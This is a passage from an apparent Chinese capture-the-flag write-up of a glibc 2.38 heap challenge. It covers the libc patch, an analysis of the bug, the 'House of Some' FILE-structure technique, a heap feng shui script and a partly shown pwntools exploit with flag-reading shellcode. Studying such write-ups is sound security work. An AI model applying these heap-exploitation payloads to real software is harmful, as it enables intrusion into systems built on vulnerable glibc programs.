class=\"keyword\">default</span>:</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;invalid option %ld.\\n&quot;</span>, choice);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>除了题目代码之外，还自己编译了一个libc，加上patch，patch如下</p>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">diff --git a/libio/libioP.h b/libio/libioP.h</span></span><br><span class=\"line\"><span class=\"comment\">index 745278e..b3858d1 100644</span></span><br><span class=\"line\"><span class=\"comment\">--- a/libio/libioP.h</span></span><br><span class=\"line\"><span class=\"comment\">+++ b/libio/libioP.h</span></span><br><span class=\"line\"><span class=\"meta\">@@ -100,7 +100,7 @@</span></span><br><span class=\"line\"> #define _IO_JUMPS_FILE_plus(THIS) \\</span><br><span class=\"line\">   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span><br><span class=\"line\"> #define _IO_WIDE_JUMPS(THIS) \\</span><br><span class=\"line\"><span class=\"deletion\">-  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class=\"line\"><span class=\"addition\">+  (IO_validate_vtable(_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable))</span></span><br><span class=\"line\"> #define _IO_CHECK_WIDE(THIS) \\</span><br><span class=\"line\">   (_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data) != NULL)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到，这里对wide_data加上了patch</p>\n<p>编译时的命令如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CC=&quot;gcc&quot; CXX=&quot;g++&quot; CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; ../configure --prefix=/home/csome/houseofsome/glibc-2.38/build/x64 --disable-werror --enable-bind-now</span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<p>详细编译流程见Tover师兄写的<a href=\"https://0xffff.one/d/337\">https://0xffff.one/d/337</a></p>\n<h2 id=\"简单的分析\"><a href=\"#简单的分析\" class=\"headerlink\" title=\"简单的分析\"></a>简单的分析</h2><p>通过逆向可以知道，这里泄露libc是通过scanf的未写入trick实现的，但是ida观察init函数的时候，并不能发现stdin等数据放到了栈上，需要gdb观察或者阅读汇编才知道。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">init</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp1 = <span class=\"built_in\">stdin</span>;</span><br><span class=\"line\">    setbuf(tmp1, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp2 = <span class=\"built_in\">stdout</span>;</span><br><span class=\"line\">    setbuf(tmp2, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp3 = <span class=\"built_in\">stderr</span>;</span><br><span class=\"line\">    setbuf(tmp3, <span class=\"number\">0</span>);</span><br><span class=\"line\">    install_seccomp();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其次，这里有一次libc内任意地址写\\x00的机会在draw功能</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">draw</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(magic || !dev || !name) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> addr, length;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;offset&gt; &quot;</span>);</span><br><span class=\"line\">    addr = getint();</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;length&gt; &quot;</span>);</span><br><span class=\"line\">    length = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(length &lt; <span class=\"number\">0</span> || length &gt; <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fread(<span class=\"number\">0x114514000</span>+addr, <span class=\"number\">1</span>, <span class=\"number\">1</span>, dev);</span><br><span class=\"line\">    magic = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还有一个小trick——fopen，这个函数会使用malloc分配一个IO_FILE_plus结构，作为打开文件的管理块，并通过头插法进入IO_list_all</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">change_dev</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dev) fclose(dev);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> op;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. /dev/urandom\\n2. /dev/zero\\n3. /dev/null\\ndev&gt; &quot;</span>);</span><br><span class=\"line\">    op = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(op == <span class=\"number\">1</span>) dev = fopen(<span class=\"string\">&quot;/dev/urandom&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">2</span>) dev = fopen(<span class=\"string\">&quot;/dev/zero&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> dev = fopen(<span class=\"string\">&quot;/dev/null&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dev == <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;open dev error.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    setbuf(dev, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>总结一下</p>\n<ol>\n<li>已知Libc地址</li>\n<li>一次libc内任意地址写1字节\\x00，off by null</li>\n<li>fopen能使得IO_list_all内写入heap地址</li>\n<li>由于wide_data的vtable加入了check，故不能使用apple2的链条</li>\n</ol>\n<h2 id=\"House-of-Some\"><a href=\"#House-of-Some\" class=\"headerlink\" title=\"House of Some\"></a>House of Some</h2><p>详细的原理见<a href=\"https://blog.csome.cc/p/house-of-some/\">https://blog.csome.cc/p/house-of-some/</a></p>\n<p>其使用的方法是</p>\n<ol>\n<li>已知glibc基地址</li>\n<li>可控的已知地址（可写入内容构造fake file）</li>\n<li>需要一次libc内任意地址写可控地址</li>\n<li>程序能正常退出或者通过exit()退出</li>\n</ol>\n<p>其中，条件1和4程序中可以直接满足，条件3可以通过fopen和一次off by null完成，条件2可以被弱化，并不需要已知，只需要可控即可</p>\n<p>那么在构造任意地址写的fake_file的过程中，需要wide_data指针，这个指针需要在可控地址位置——堆内，但是我们并不能泄露堆地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_file_read = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x38</span>: 任意地址写的起始地址, <span class=\"comment\"># _IO_buf_base</span></span><br><span class=\"line\">    <span class=\"number\">0x40</span>: 任意地址写的终止地址, <span class=\"comment\"># _IO_buf_end</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x82</span>: <span class=\"string\">b&quot;\\x00&quot;</span>, <span class=\"comment\"># _vtable_offset</span></span><br><span class=\"line\">    <span class=\"number\">0xc0</span>: <span class=\"number\">2</span>, <span class=\"comment\"># _mode</span></span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: wide_data的地址, <span class=\"comment\"># _wide_data</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: 下一个调用的fake file地址, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>: _IO_wfile_jumps, <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_wide_data = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xe0</span>: _IO_file_jumps - <span class=\"number\">0x48</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>这里需要使用largebin的next size指针残留，构造出一个合法的wide_data地址</p>\n<p>PS：这里可以运用<a href=\"https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more%EF%BC%8C%E6%94%B9%E8%BF%9B%E5%90%8E%E5%B0%B1%E4%B8%8D%E9%9C%80%E8%A6%81wide_data%E4%BA%86\">https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more，改进后就不需要wide_data了</a></p>\n<p>风水脚本如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name(<span class=\"number\">0x2b0</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x260</span>: &#123;</span><br><span class=\"line\">        <span class=\"number\">0x18</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x20</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>) + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x1f00</span>-<span class=\"number\">0x730</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x400</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x590</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xe0</span>-<span class=\"number\">0x60</span>: libc.symbols[<span class=\"string\">&#x27;_IO_file_jumps&#x27;</span>] - <span class=\"number\">0x48</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>) + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x50</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x600</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x610</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x300</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x2f0</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x360</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x210</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>最后伪造，这里中间需要使用指针残留，所以伪造fake_file的时候，需要分开</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">environ = libc.symbols[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\">name(<span class=\"number\">0xb0</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x38</span>: environ+<span class=\"number\">8</span>, <span class=\"comment\"># _IO_buf_base</span></span><br><span class=\"line\">    <span class=\"number\">0x40</span>: environ+<span class=\"number\">8</span>+<span class=\"number\">0x400</span>, <span class=\"comment\"># _IO_buf_end</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: environ+<span class=\"number\">8</span>, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0x82</span>: <span class=\"string\">b&quot;\\x00&quot;</span>, <span class=\"comment\"># _vtable_offset</span></span><br><span class=\"line\">    <span class=\"number\">0x88</span>: environ-<span class=\"number\">0x10</span>,</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: <span class=\"string\">b&quot;\\n&quot;</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">name(<span class=\"number\">0x20</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xc0</span>-<span class=\"number\">0x20</span>-<span class=\"number\">0xa0</span>: <span class=\"number\">2</span>, <span class=\"comment\"># _mode</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>-<span class=\"number\">0x20</span>-<span class=\"number\">0xa0</span>: libc.symbols[<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>], <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)[:-<span class=\"number\">1</span>] + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>最后houseofsome一把梭</p>\n<h2 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h2><p>House_of_some工具见<a href=\"https://github.com/CsomePro/House-of-Some\">https://github.com/CsomePro/House-of-Some</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> House_of_some <span class=\"keyword\">import</span> HouseOfSome</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(</span><br><span class=\"line\"><span class=\"string\">f&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">mov rax, <span class=\"subst\">&#123;u64(<span class=\"string\">b&quot;./flag&quot;</span> + <span class=\"built_in\">bytearray</span>([<span class=\"number\">0</span>,<span class=\"number\">0</span>]))&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">push rax</span></span><br><span class=\"line\"><span class=\"string\">mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, 0</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 2</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi, rax</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rdx, 0x40</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 0</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi, 1</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rdx, 0x40</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 1</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./houseofsome&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = remote(&quot;127.0.0.1&quot;, 12000)</span></span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">name</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;size&gt; &quot;</span>, tob(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;name&gt; &quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dev</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;dev&gt; &quot;</span>, tob(idx))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">draw</span>(<span class=\"params\">offset, length</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;offset&gt; &quot;</span>, tob(offset))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;length&gt; &quot;</span>, tob(length))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;5&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;-&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;invalid option &quot;</span>)</span><br><span class=\"line\">leak = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&quot;.&quot;</span>, drop=<span class=\"literal\">True</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;leak : <span class=\"subst\">&#123;leak:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">libc_base = leak - <span class=\"number\">0x2205c0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>, checksec=<span class=\"literal\">None</span>)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">name(<span class=\"number\">0x2b0</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x260</span>: &#123;</span><br><span class=\"line\">        <span class=\"number\">0x18</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x20</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>) + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x1f00</span>-<span class=\"number\">0x730</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x400</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x590</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xe0</span>-<span class=\"number\">0x60</span>: libc.symbols[<span 